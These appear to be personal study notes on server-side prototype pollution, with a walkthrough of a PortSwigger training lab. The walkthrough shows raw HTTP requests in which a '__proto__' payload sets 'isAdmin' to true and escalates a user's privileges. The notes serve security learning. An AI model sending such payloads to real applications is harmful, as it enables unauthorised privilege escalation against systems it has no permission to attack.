# Server Side prototype Pollution
 - Difficult to detect cause its on server.
 - unsafely merges user-controllable input into a server-side JavaScript object
 - for...in loop iterates over all of an object's enumerable properties, including ones that it has inherited via the prototype chain.
```
const myObject = { a: 1, b: 2 };

// pollute the prototype with an arbitrary property
Object.prototype.foo = 'bar';

// confirm myObject doesn't have its own foo property
myObject.hasOwnProperty('foo'); // false

// list names of properties of myObject
for(const propertyKey in myObject){
    console.log(propertyKey);
}

// Output: a, b, foo
```
Ex: 
```POST /user/update HTTP/1.1
Host: vulnerable-website.com
...
{
    "user":"wiener",
    "firstName":"Peter",
    "lastName":"Wiener",
    "__proto__":{
        "foo":"bar"
    }
}
```

```
HTTP/1.1 200 OK
...
{
    "username":"wiener",
    "firstName":"Peter",
    "lastName":"Wiener",
    "foo":"bar"
}
```
 - Here we add "__proto__" in request, and see it being merged.
 - Any features that involve updating user data are worth investigating as these often involve merging the incoming data into an existing object that represents the user within the application.

# LAB
 - https://portswigger.net/web-security/prototype-pollution/server-side/lab-privilege-escalation-via-server-side-prototype-pollution
 - Privilige escalation.
 - Original Request and Response
```
POST /my-account/change-address HTTP/2
Host: 0ad5002803e080678249b5c900b800d4.web-security-academy.net
Cookie: session=F0MSnC6xlW4r4kHpiCfA5aqyVPBAYoUs
Content-Length: 231
Sec-Ch-Ua: 
Sec-Ch-Ua-Platform: ""
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36
Content-Type: application/json;charset=UTF-8
Accept: */*
Origin: https://0ad5002803e080678249b5c900b800d4.web-security-academy.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0ad5002803e080678249b5c900b800d4.web-security-academy.net/my-account?id=wiener
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9

{
	"address_line_1": "Wiener HQ",
	"address_line_2": "One Wiener Way",
	"city": "Wienerville",
	"postcode": "BU1 1RP",
	"country": "UK",
	"sessionId": "F0MSnC6xlW4r4kHpiCfA5aqyVPBAYoUs"
}
```
```
HTTP/2 200 OK
X-Powered-By: Express
Cache-Control: no-store
Content-Type: application/json; charset=utf-8
Etag: W/"d0-C/bYHMdz0P5+PlERv2aVqQjVdR8"
Date: Thu, 29 Jun 2023 21:43:26 GMT
Keep-Alive: timeout=5
X-Frame-Options: SAMEORIGIN
Content-Length: 208

{"username":"wiener","firstname":"Peter","lastname":"Wiener","address_line_1":"Wiener HQ","address_line_2":"One Wiener Way","city":"Wienerville","postcode":"BU1 1RP","country":"UK","isAdmin":false"}
```
 - I see `isAdmin`
 - Then I send
```
{
	"address_line_1": "Wiener HQ",
	"address_line_2": "One Wiener Way",
	"city": "Wienerville",
	"postcode": "BU1 1RP",
	"country": "UK",
"__proto__":{
        "foo":"bar"
    },
	"sessionId": "F0MSnC6xlW4r4kHpiCfA5aqyVPBAYoUs"
}
```
```
{"username":"wiener","firstname":"Peter","lastname":"Wiener","address_line_1":"Wiener HQ","address_line_2":"One Wiener Way","city":"Wienerville","postcode":"BU1 1RP","country":"UK","isAdmin":false,"foo":"bar"}
```
 - I see `foo:bar` being set.
```
{
	"address_line_1": "Wiener HQ",
	"address_line_2": "One Wiener Way",
	"city": "Wienerville",
	"postcode": "BU1 1RP",
	"country": "UK",
	"__proto__": {
		"foo": "bar",
		"isAdmin": true
	},
	"sessionId": "F0MSnC6xlW4r4kHpiCfA5aqyVPBAYoUs"
}
```

```
{"username":"wiener","firstname":"Peter","lastname":"Wiener","address_line_1":"Wiener HQ","address_line_2":"One Wiener Way","city":"Wienerville","postcode":"BU1 1RP","country":"UK","isAdmin":true,"foo":"bar"}
```
 - `isAdmin` is set to true.
